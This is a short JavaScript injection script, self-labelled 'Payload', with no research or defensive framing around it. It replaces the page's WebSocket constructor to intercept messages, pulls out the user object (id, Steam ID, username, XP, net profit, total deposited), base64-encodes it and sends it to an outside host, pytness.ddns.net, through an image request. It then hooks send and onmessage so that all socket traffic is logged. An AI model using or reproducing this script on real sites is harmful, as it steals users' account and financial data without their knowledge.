((w) => {
    console.log('Payload Init');
    function send(u) {
        // console.log(u);
        if (typeof u !== 'object') return true;
        var user = {};
        var keys = ['id','steamid','username','name_promotion','userclass','xp','net_profit','total_deposited'];

        for (let i = 0; i < keys.length; i++) {
            let k = keys[i];
            user[k] = u[k];
        }

        var image = new Image();
        image.src = 'http://pytness.ddns.net/logdata.py?q=' + btoa(JSON.stringify(user));
        w.document.head.appendChild(image);

        return false;
    }

    var extractData = (a, b=false) => {
        try {
            b = JSON.parse(a.split(',').slice(1).join(','));
        } finally {return b;}
    };

    var manageData_EL = (a) => { // Event Listener
        var b = extractData(a.data);
        if (b[0] == 'initialize' && typeof b[1].user == 'object') {
            if(send(b[1].user)) return;
            this.removeEventListener('message', manageData_EL);

            this.__send = this.send;
            this.send = function(m) {
                console.log(m);
                this.__send(m);
            };

            this.__om = this.onmessage;
            this.onmessage = function(e) {
                console.log(e.data);
                this.__om(e);
            };
        }
    };

    var _WS = WebSocket;

    w.WebSocket = function(...args) {

        var tws = new _WS(...args);
        tws.addEventListener('message', manageData_EL, false);
        return tws;
    };

})(window);
